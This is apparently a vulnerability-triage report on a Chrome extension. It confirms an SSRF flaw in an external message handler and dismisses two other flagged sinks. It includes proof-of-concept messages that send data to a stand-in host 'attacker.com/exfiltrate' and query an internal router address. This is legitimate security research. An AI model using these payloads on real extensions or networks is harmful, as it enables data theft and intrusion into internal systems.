# CoCo Analysis: pokenhlckhaoenaipopidoddgdbhlegh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (fetch_resource_sink, sendResponseExternal_sink, chrome_browsingData_remove_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pokenhlckhaoenaipopidoddgdbhlegh/opgen_generated_files/bg.js
Line 994: fetch(request.url, {

**Code:**

```javascript
// Background script - External message handler (bg.js lines 987-1035)
chrome.runtime.onMessageExternal.addListener(function (
  request,  // ← attacker-controlled from external source
  sender,
  sendResponse
) {
  console.log(request);
  if (request.type === "logBulkMsgs") {
    fetch(request.url, {  // ← attacker-controlled URL (Line 994)
      method: request.reqType,  // ← attacker-controlled method
      body: JSON.stringify({
        id: request.params.id,
        sentList: request.params.sentList,
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    })
      .then((response) => response.json())
      .then((json) => {
        sendResponse(json);  // ← response sent back to attacker
        console.log(json);
      });
  } else if (request.type === "editBlockList") {
    fetch(request.url, {  // ← attacker-controlled URL (Line 1010)
      method: request.reqType,  // ← attacker-controlled method
      body: JSON.stringify({
        id: request.params.id,
        list: request.params.list,
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
      },
    })
      .then((response) => response.json())
      .then((json) => {
        sendResponse(json);  // ← response sent back to attacker
        console.log(json);
      });
  } else {
    fetch(request.url, {  // ← attacker-controlled URL (Line 1026)
      mode: "no-cors",
      method: request.reqType,  // ← attacker-controlled method
    }).then(async (response) => {
      let res = await response.json();
      console.log({ res, status: response.status });
      sendResponse({ res, status: response.status });  // ← response sent back to attacker
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From malicious website listed in manifest's externally_connectable (https://*.whatsapp.com/*)
// Attacker sends external message to extension
chrome.runtime.sendMessage(
  "pokenhlckhaoenaipopidoddgdbhlegh",  // Extension ID
  {
    type: "logBulkMsgs",
    url: "https://attacker.com/exfiltrate",  // Attacker-controlled destination
    reqType: "POST",
    params: {
      id: "malicious-id",
      sentList: ["stolen", "data"]
    }
  },
  function(response) {
    console.log("Response from internal network:", response);
  }
);

// Alternative attack - SSRF to internal network
chrome.runtime.sendMessage(
  "pokenhlckhaoenaipopidoddgdbhlegh",
  {
    type: "other",
    url: "http://192.168.1.1/admin",  // Internal network resource
    reqType: "GET"
  },
  function(response) {
    console.log("Internal network response:", response);
  }
);
```

**Impact:** Privileged SSRF vulnerability allowing attacker to make arbitrary cross-origin requests from extension context with elevated privileges. Attacker can exfiltrate data to attacker-controlled servers, access internal network resources, and receive responses back through sendResponse callback.

---

## Sink 2: fetch_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pokenhlckhaoenaipopidoddgdbhlegh/opgen_generated_files/bg.js
Line 265: var responseText = 'data_from_fetch';

**Classification:** FALSE POSITIVE

**Reason:** This detection is in CoCo framework code (before line 963 where original extension code starts). The framework mock shows a hardcoded placeholder string 'data_from_fetch', not actual fetch response data flowing to sendResponse in the real extension code.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_browsingData_remove_sink

**CoCo Trace:**
Not explicitly shown in used_time.txt but mentioned in the summary.

**Code:**

```javascript
// Background script (bg.js line 1037-1038)
chrome.action.onClicked.addListener((tab) => {
  chrome.browsingData.remove({}, { serviceWorkers: true }, () => null);
  // ... other code
});
```

**Classification:** FALSE POSITIVE

**Reason:** The browsingData.remove is triggered by chrome.action.onClicked (user clicking extension icon), not by external messages. No attacker-triggered flow exists for this sink.
